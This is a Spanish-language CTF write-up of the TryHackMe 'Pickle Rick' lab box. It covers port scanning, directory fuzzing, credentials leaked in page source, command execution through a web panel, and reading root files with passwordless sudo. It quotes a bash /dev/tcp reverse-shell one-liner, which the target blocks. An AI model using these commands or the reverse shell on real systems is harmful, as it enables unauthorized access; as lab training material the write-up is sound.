---
layout: single
title: Pickle Rick - TryHackMe
excerpt: "Pickle Rick es un CTF de la plataforma de Tryhackme de dificultad muy facil es una maquina linux donde tendremos que encontrar 3 ingredientes para que Rick pueda hacer su posion para transformarse de vuelta a un humano las credenciales para conectarnos por un panel de login no las daran mientras enumeramos la maquina al final tendremos que leer los ingredientes en un apartado de la web donde podemos ejecutar comandos, en la maquina victima intente enviarme una reverse shell pero esta bloqueado el comando"
date: 2023-03-03
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-rickm/logo.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - Tryhackme
  - infosec
tags:  
  - Linux enumeration
  - Fuzzing
---
![](/assets/images/try-writeup-rickm/logo.png)

```bash
❯ ping -c 1 10.10.136.234
PING 10.10.136.234 (10.10.136.234) 56(84) bytes of data.
64 bytes from 10.10.136.234: icmp_seq=1 ttl=61 time=463 ms

--- 10.10.136.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 462.876/462.876/462.876/0.000 ms
❯ whichSystem.py 10.10.136.234

10.10.136.234 (ttl -> 61): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.10.136.234 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 13:01 CST
Nmap scan report for 10.10.136.234
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9828b8ef2be01ade352c2f290d85ec6b (RSA)
|   256 82581151eaa21e774c656f0b2d87580f (ECDSA)
|_  256 6191e8dadcaf7bc3327255efe58cb122 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.90 seconds
```

```bash
❯ nmap --script=http-enum -p80 10.10.136.234 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 13:03 CST
Nmap scan report for 10.10.136.234
Host is up (0.20s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 22.22 seconds
```

## Enumeration

```ruby
❯ whatweb http://10.10.136.234
http://10.10.136.234 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.136.234], JQuery, Script, Title[Rick is sup4r cool]
```

Y bueno en la web le estan diciendo a `Morty` que le ayude a encontrar los ingredientes para acabar su posion pero que el unico problema es que no sabe donde esta su contraseña

![](/assets/images/try-writeup-rickm/Web1.png)

Si vemos el codigo fuente vemos que encontramos credenciales

![](/assets/images/try-writeup-rickm/Web2.png)

`Username:R1ckRul3s`

Al tener un usuario podemos hacer fuerza bruta para encontrar la contraseña ya que el puerto `22` esta abierto vamos a seguir enumerando

`Nmap` nos resporta rutas interesantes

Encontramos esto en la ruta `robots.txt` no se si sea una contraseña ya que es un `CTF` pero por si acaso vamos a guardarla

![](/assets/images/try-writeup-rickm/Web3.png)

`Wubbalubbadubdub`

Ahora vemos un panel de login

![](/assets/images/try-writeup-rickm/Web4.png)

Esta usundo `php` asi que podemos fuzzear por otras rutas existentes

Encontramos rutas que ya habiamos visto la ruta `portal.php` nos redirige a `login.php`

```bash
❯ gobuster dir -u http://10.10.136.234 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 90 -x php,txt,html --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.136.234
[+] Method:                  GET
[+] Threads:                 90
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/03 13:15:48 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/index.html           (Status: 200) [Size: 1062]
/icons/               (Status: 403) [Size: 294] 
/assets/              (Status: 200) [Size: 2192]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
```

En la ruta `assets` vemos esto

![](/assets/images/try-writeup-rickm/Web5.png)

Vamos a probar el usuario que nos dieron para ver si es correcto

Si probamos lo que encontramos nos deja conectarnos y esta es la web

![](/assets/images/try-writeup-rickm/Web6.png)

`R1ckRul3s:Wubbalubbadubdub`

Si empezamos a ver lo que hay encontramos esto en `Potions`

![](/assets/images/try-writeup-rickm/Web7.png)

Si vemos todo nos redirige a `/denied.php` exepto `Commands`

![](/assets/images/try-writeup-rickm/Web8.png)

Bueno si vemos el codigo fuente  `portal.php` al logiarnos  al parecer vemos algo en base64

![](/assets/images/try-writeup-rickm/Web9.png)

```bash
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

Despues de decodar varias veces la cadena ya que cada que decodeabas de daba otra llegamos a este resultado 

```bash
❯ echo 'cmFiYml0IGhvbGU=' | base64 -d
rabbit hole
```

Y bueno nada interesante vamos a ver que es lo que podemos hacer en el apartado de `comands`

Estamos ejecutando comandos como `www-data` 

![](/assets/images/try-writeup-rickm/Web10.png)

Si hacemos un `ls -la` vemos que hay un archivo `.txt`

![](/assets/images/try-writeup-rickm/Web11.png)

Si lo vemos en la web encontramos esto

![](/assets/images/try-writeup-rickm/Web12.png)

Si hacemos un `hostname -i` estamos ejecutando comandos en la maquina victima asi que para enumerar mejor vamos a ganar acceso

![](/assets/images/try-writeup-rickm/Web13.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

```

Usaremos este `oneliner` que pondremos en la parte donde escribimos comandos

<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Vale al probar varios `oneliners` y ademas poniendo el `&` a `%26` la web me dice esto

![](/assets/images/try-writeup-rickm/Web13.png)

Asi que vamos a tener que descubrir los 2 ingredentes faltantes desde esa parte de la web

Cuando hicimos un `ls -la` nos mostro otro archivo llamado `clue.txt` vamos a ver que encontramos hay

![](/assets/images/try-writeup-rickm/Web14.png)

Si ejecutamos este comando `cd /home;ls -la;pwd` vemos estos usuarios

![](/assets/images/try-writeup-rickm/Web15.png)

Si ejecutamos el comando `cd /home/rick;ls -la;pwd` vemos el segundo ingrediente

```bash
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
/home/rick
```

Si ejecutamos este comando `less /home/rick/"second ingredients"` podemos ver el ingrediente 

```bash
1 jerry tear
```

Ahora solo nos falta el ultimo 

Bueno algo a saber es que si hacemos un `sudo -l` podemos ejecutar cualquier comando como `www-data` sin proporcionar contraseña

```bash
Matching Defaults entries for www-data on ip-10-10-136-234.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-136-234.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Asi que ahora supongo que el ultimo ingrediente esta en la ruta de `root` 

Si ejecutamos este comando `sudo ls -la /root` vemos el `3rd.txt` asi vamos a leerla

```bash
sudo less /root/3rd.txt
```

```bash
3rd ingredients: fleeb juice
```

Intente ver la id_rsa de `root` pero no me dejo me dio el mismo error de `command disabled`

```bash
sudo cat /root/.ssh/authorized_keys
```




